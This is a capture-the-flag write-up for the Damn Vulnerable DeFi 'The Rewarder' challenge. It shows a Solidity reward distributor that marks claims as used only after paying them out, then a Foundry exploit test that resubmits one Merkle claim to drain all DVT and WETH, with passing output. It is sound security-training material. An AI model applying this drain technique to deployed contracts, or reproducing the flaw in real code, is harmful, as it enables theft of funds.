# Damn Vulnerable Defi - The Rewarder
- Scope
    - TheRewarderDistributor.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## Incorrect claims accounting leading to repeated claims

### Summary
The `claimRewards()` function does not update and mark the claim as Claimed after rewarding, resulting in one claim to be repeatedly claimed.

### Vulnerability Details
The `claimRewards()` function allowed claiming multiple times in a single transaction and only updates the claim as Claimed at the end of it. Hence, it could be exploited by submitting one claim repeatedly to drain the contract before it is marked as Claimed.
```diff
// Allow claiming rewards of multiple tokens in a single transaction
    function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
        Claim memory inputClaim;
        IERC20 token;
        uint256 bitsSet; // accumulator
        uint256 amount;

        for (uint256 i = 0; i < inputClaims.length; i++) {
            inputClaim = inputClaims[i];

            uint256 wordPosition = inputClaim.batchNumber / 256;
            uint256 bitPosition = inputClaim.batchNumber % 256;

            if (token != inputTokens[inputClaim.tokenIndex]) {
                if (address(token) != address(0)) {
                    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
                }

                token = inputTokens[inputClaim.tokenIndex];
                bitsSet = 1 << bitPosition; // set bit at given position
                amount = inputClaim.amount;
            } else {
                bitsSet = bitsSet | 1 << bitPosition;
                amount += inputClaim.amount;
            }

            // for the last claim
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
            bytes32 root = distributions[token].roots[inputClaim.batchNumber];

            if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

            inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
        }
    }
```

### Impact/Proof of Concept
1. Create a list of claims to repeatedly claim the same allocated amount
2. Submit the list of claims and drain the contract
3. Transfer the tokens over to recovery
```diff
function test_theRewarder() public checkSolvedByPlayer {
        console.log("playerAddr: ", player);
        // Find the distribution allocated to player (0x44E97aF4418b7a17AABD8090bEA0A471a366305C) in dvt-distribution.json & weth-distribution.json
        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        // Calculate how many tx is needed to fully drain both tokens
        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;
        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
        uint totalTxCount = dvtTxCount + wethTxCount;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create the list of Claims
        Claim[] memory claims = new Claim[](totalTxCount);
        // Add the claims into list
        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_DVT_CLAIM_AMOUNT,
                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(dvtLeaves, 188) // Index of player's node
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first WETH batch
                    amount: PLAYER_WETH_CLAIM_AMOUNT,
                    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
                    proof: merkle.getProof(wethLeaves, 188) // Index of player's node
                });
            }
        }

        // Start claimRewards()
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        // Transfer the tokens over to recovery
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
        console.log("distributor WETH balance: ", weth.balanceOf(address(distributor)) / 1e15);
        console.log("distributor DVT balance: ", dvt.balanceOf(address(distributor)) / 1e16);
        console.log("recovery WETH balance: ", weth.balanceOf(recovery));
        console.log("recovery DVT balance: ", dvt.balanceOf(recovery));
    }
```

Results
```diff
[PASS] test_theRewarder() (gas: 1011608840)
Logs:
  playerAddr:  0x44E97aF4418b7a17AABD8090bEA0A471a366305C
  distributor WETH balance:  0
  distributor DVT balance:  0
  recovery WETH balance:  998938703105422020
  recovery DVT balance:  9991970238730241694

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 3.26s (3.24s CPU time)
```
